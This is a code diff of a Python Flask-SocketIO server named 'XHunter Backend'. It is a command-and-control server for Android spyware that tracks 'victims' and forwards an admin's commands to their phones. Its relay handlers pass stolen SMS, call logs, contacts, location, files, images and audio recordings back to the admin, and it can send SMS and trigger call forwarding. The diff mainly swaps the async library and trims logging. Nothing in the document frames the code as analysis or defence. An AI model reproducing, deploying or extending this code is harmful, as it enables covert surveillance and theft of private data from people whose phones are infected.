@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-XHunter Backend Server - Python 3.14 Compatible
+XHunter Backend Server - Python 3.11
 Deploy: Render
 Port: 10000
 """
 
-from gevent import monkey
-monkey.patch_all()
+import eventlet
+eventlet.monkey_patch()
 
 from flask import Flask, request as flask_request, jsonify
 from flask_socketio import SocketIO, emit
@@ -15,15 +15,14 @@ import json
 import os
 from datetime import datetime
 
-# ==================== CONFIG ====================
 app = Flask(__name__)
-app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'xhunter-prod-secret-2024')
+app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'xhunter-prod')
 CORS(app, resources={r"/*": {"origins": "*"}})
 
 socketio = SocketIO(
     app,
     cors_allowed_origins="*",
-    async_mode='gevent',
+    async_mode='eventlet',
     ping_timeout=60,
     ping_interval=25,
     max_http_buffer_size=100 * 1024 * 1024,
@@ -35,31 +34,23 @@ socketio = SocketIO(
 
 PORT = int(os.environ.get('PORT', 10000))
 
-# ==================== DATA STORE ====================
 victimList = {}
 victimData = {}
 adminSocketId = None
-
-# ==================== ROUTES ====================
 
 @app.route('/')
 def index():
     return jsonify({
         'server': 'XHunter Backend',
-        'version': '2.0.1',
+        'version': '2.0.2',
         'status': 'online',
-        'devices_connected': len(victimList),
-        'admin_connected': adminSocketId is not None,
-        'time': datetime.now().isoformat()
+        'devices': len(victimList),
+        'admin': adminSocketId is not None
     })
 
 @app.route('/health')
 def health():
-    return jsonify({
-        'status': 'ok',
-        'devices': len(victimList),
-        'admin': adminSocketId is not None
-    })
+    return jsonify({'status': 'ok', 'devices': len(victimList)})
 
 @app.route('/api/devices')
 def api_devices():
@@ -71,32 +62,21 @@ def api_devices():
             'android': data.get('android', 'Unknown'),
             'battery': data.get('battery', 0),
             'sim': data.get('sim', 'Unknown'),
-            'manufacture': data.get('manufacture', 'Unknown'),
-            'online': True,
-            'connected_at': data.get('connectedAt', '')
+            'online': True
         })
-    return jsonify({
-        'success': True,
-        'count': len(devices),
-        'devices': devices
-    })
-
-# ==================== SOCKET.IO EVENTS ====================
+    return jsonify({'success': True, 'count': len(devices), 'devices': devices})
 
 @socketio.on('connect')
 def on_connect(auth=None):
-    sid = flask_request.sid
-    print(f"[CONNECT] {sid}")
+    print(f"[+] {flask_request.sid}")
 
 @socketio.on('disconnect')
 def on_disconnect(reason=None):
     global adminSocketId
     sid = flask_request.sid
-    print(f"[DISCONNECT] {sid}")
 
     if sid == adminSocketId:
         adminSocketId = None
-        print("[ADMIN] Left")
         return
 
     for dev_id, sock_id in list(victimList.items()):
@@ -105,21 +85,17 @@ def on_disconnect(reason=None):
             victimData.pop(dev_id, None)
             if adminSocketId:
                 socketio.emit('disconnectClient', dev_id, to=adminSocketId)
-            print(f"[DEVICE] {dev_id} left")
             break
 
 @socketio.on('adminJoin')
 def on_admin_join():
     global adminSocketId
     adminSocketId = flask_request.sid
-    print(f"[ADMIN] {adminSocketId}")
 
     for dev_id, data in list(victimData.items()):
         socketio.emit('join', data, to=adminSocketId)
 
-    socketio.emit('adminConnected', {
-        'victimCount': len(victimList)
-    }, to=adminSocketId)
+    socketio.emit('adminConnected', {'victimCount': len(victimList)}, to=adminSocketId)
 
 @socketio.on('join')
 def on_device_join(data):
@@ -134,9 +110,6 @@ def on_device_join(data):
         'battery': data.get('battery', 0),
         'sim': data.get('sim', 'Unknown'),
         'manufacture': data.get('manufacture', 'Unknown'),
-        'appInstallTime': data.get('appInstallTime', ''),
-        'freeDiskStorage': data.get('freeDiskStorage', 0),
-        'totalDiskCapacity': data.get('totalDiskCapacity', 0),
         'socketId': sid,
         'online': True,
         'connectedAt': datetime.now().isoformat()
@@ -147,10 +120,7 @@ def on_device_join(data):
     if adminSocketId:
         socketio.emit('join', victimData[dev_id], to=adminSocketId)
 
-    socketio.emit('deviceRegistered', {
-        'success': True,
-        'deviceId': dev_id
-    }, to=sid)
+    socketio.emit('deviceRegistered', {'success': True, 'deviceId': dev_id}, to=sid)
 
 @socketio.on('request')
 def on_request(data):
@@ -169,65 +139,46 @@ def on_request(data):
         socketio.emit(action, payload_str, to=victimList[to])
 
     except Exception as e:
-        print(f"[ERROR] request: {e}")
-
-# ==================== RELAY HANDLERS ====================
+        print(f"[ERR] {e}")
 
 def relay(event, data):
     if adminSocketId:
         socketio.emit(event, data, to=adminSocketId)
 
 @socketio.on('getDir')
-def r_getDir(data): relay('getDir', data)
-
+def r_dir(data): relay('getDir', data)
 @socketio.on('getSMS')
-def r_getSMS(data): relay('getSMS', data)
-
+def r_sms(data): relay('getSMS', data)
 @socketio.on('getCallLog')
-def r_getCallLog(data): relay('getCallLog', data)
-
+def r_call(data): relay('getCallLog', data)
 @socketio.on('getContacts')
-def r_getContacts(data): relay('getContacts', data)
-
+def r_con(data): relay('getContacts', data)
 @socketio.on('getInstalledApps')
-def r_getApps(data): relay('getInstalledApps', data)
-
+def r_app(data): relay('getInstalledApps', data)
 @socketio.on('getLocation')
-def r_getLocation(data): relay('getLocation', data)
-
+def r_loc(data): relay('getLocation', data)
 @socketio.on('sendSMS')
-def r_sendSMS(data): relay('sendSMS', data)
-
+def r_send(data): relay('sendSMS', data)
 @socketio.on('download')
-def r_download(data): relay('download', data)
-
+def r_dl(data): relay('download', data)
 @socketio.on('previewImage')
-def r_preview(data): relay('previewImage', data)
-
+def r_pre(data): relay('previewImage', data)
 @socketio.on('callForwardResult')
-def r_callForward(data): relay('callForwardResult', data)
-
+def r_cf(data): relay('callForwardResult', data)
 @socketio.on('audioRecording')
-def r_audioRecording(data): relay('audioRecording', data)
-
+def r_audio(data): relay('audioRecording', data)
 @socketio.on('audioRecordingStatus')
-def r_audioStatus(data): relay('audioRecordingStatus', data)
-
+def r_astat(data): relay('audioRecordingStatus', data)
 @socketio.on('vibrateResult')
-def r_vibrate(data): relay('vibrateResult', data)
-
+def r_vib(data): relay('vibrateResult', data)
 @socketio.on('torchResult')
-def r_torch(data): relay('torchResult', data)
-
+def r_tor(data): relay('torchResult', data)
 @socketio.on('error')
-def r_error(data): relay('error', data)
-
+def r_err(data): relay('error', data)
 @socketio.on('ping')
 def on_ping(data=None):
     emit('pong', {'time': datetime.now().isoformat()})
 
-# ==================== MAIN ====================
-
 if __name__ == '__main__':
-    print(f"XHunter Backend v2.0.1 - Port: {PORT}")
-    socketio.run(app, host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
+    print(f"XHunter Backend - Port: {PORT}")
+    socketio.run(app, host='0.0.0.0', port=PORT, debug=False)
